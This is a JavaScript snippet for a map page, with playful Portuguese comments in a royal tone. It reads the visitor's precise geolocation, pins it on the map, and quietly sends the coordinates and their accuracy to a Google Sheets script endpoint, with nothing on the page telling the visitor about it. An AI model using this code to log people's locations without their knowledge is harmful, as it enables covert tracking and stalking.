$(document).ready(function () {
    // 1. INICIALIZAÇÃO DO MAPA NO CENTRO DO REINO
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        className: 'mapa-real-preto'
    }).addTo(map);

    // 2. CAPTURA E ENVIO IMPERIAL
    navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const long = pos.coords.longitude;
        const precisao = pos.coords.accuracy;

        const dados = {
            lat: lat,
            long: long,
            precisao: precisao, // Registramos a margem de erro para vossa análise
            timestamp: new Date().toISOString()
        };

        // Move o mapa para a posição real do súdito
        map.setView([lat, long], 18);
        L.marker([lat, long]).addTo(map)
            .bindPopup(`<b>Vós estais aqui, Majestade!</b><br>Precisão: ${precisao.toFixed(1)}m`)
            .openPopup();

        // Envio para o Castelo (Google Sheets)
        fetch('https://script.google.com/macros/s/AKfycbwxiNFyhwQh_B0e2efWkC6k8hWiJuzpJOPrcu2bv1qbXEVmGc6cakSPbIY90_0sR1EnAA/exec', {
            method: 'POST',
            mode: 'no-cors',
            cache: 'no-cache',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(dados)
        })
        .then(() => console.log("✅ Dados em solo sagrado (Planilha)!"))
        .catch(erro => console.error("❌ Insurreição no envio:", erro));

    }, err => {
        console.warn("⚠️ O súdito negou a localização.", err.message);
    }, {
        enableHighAccuracy: true,
        timeout: 60000,
        maximumAge: 0
    });
});
